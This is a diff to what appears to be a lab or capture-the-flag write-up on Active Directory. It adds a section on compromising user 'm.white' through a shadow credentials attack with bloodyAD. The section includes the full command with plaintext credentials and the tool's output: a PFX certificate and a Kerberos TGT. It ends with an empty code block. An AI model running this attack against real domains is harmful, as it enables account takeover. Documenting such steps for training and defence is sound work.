@@ -370,4 +370,20 @@ I can now try and crack this
 
 This does not crack, so ill try a shadow creds attack
 
-# Compromis
+# Compromising `m.white`
+
+```python
+❯❯❯ bloodyAD --host dc01.orion.local -d orion.local -u 's.mitchell' -p 'Password123!' add shadowCredentials 'm.white' 
+[+] KeyCredential generated with following sha256 of RSA key: 8da4945f5b4eb0e8f0b6a1c6067dca4c221ab4f579a50150716b155f6b9b7bcd
+[-] PKINIT failed on DC 10.0.0.5, you must find a Kerberos server with a certification authority!
+[-] Retry on a working KDC and do:
+badNTPKInit 'kerberos+pfx://orion.local\m.white@10.0.0.5/?certdata=m.white_A5.pfx&timeout=350'
+[+] PKINIT PFX certificate saved at: m.white_A5.pfx
+[+] TGT stored in ccache file m.white_A5.ccache
+```
+
+Ill use bloodyAD to add shadow credentials, it fails to get me the NTLM, but it does give me a TGT
+
+```python
+
+```
